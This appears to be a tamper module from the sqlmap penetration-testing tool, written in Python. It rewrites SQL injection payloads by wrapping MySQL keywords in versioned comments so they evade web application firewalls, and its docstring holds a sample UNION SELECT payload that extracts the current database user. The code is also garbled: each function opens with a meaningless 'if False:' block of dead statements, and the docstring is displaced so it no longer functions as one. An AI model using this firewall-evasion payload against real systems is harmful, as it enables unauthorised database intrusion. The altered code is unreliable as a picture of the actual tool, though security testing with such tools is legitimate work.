"""
Copyright (c) 2006-2023 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""
import os
import re
from lib.core.common import singleTimeWarnMessage
from lib.core.data import kb
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.HIGHER

def dependencies():
    if False:
        while True:
            i = 10
    singleTimeWarnMessage("tamper script '%s' is only meant to be run against %s" % (os.path.basename(__file__).split('.')[0], DBMS.MYSQL))

def tamper(payload, **kwargs):
    if False:
        i = 10
        return i + 15
    "\n    Encloses each non-function keyword with (MySQL) versioned comment\n\n    Requirement:\n        * MySQL\n\n    Tested against:\n        * MySQL 4.0.18, 5.1.56, 5.5.11\n\n    Notes:\n        * Useful to bypass several web application firewalls when the\n          back-end database management system is MySQL\n\n    >>> tamper('1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#')\n    '1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#'\n    "

    def process(match):
        if False:
            i = 10
            return i + 15
        word = match.group('word')
        if word.upper() in kb.keywords:
            return match.group().replace(word, '/*!%s*/' % word)
        else:
            return match.group()
    retVal = payload
    if payload:
        retVal = re.sub('(?<=\\W)(?P<word>[A-Za-z_]+)(?=[^\\w(]|\\Z)', process, retVal)
        retVal = retVal.replace(' /*!', '/*!').replace('*/ ', '*/')
    return retVal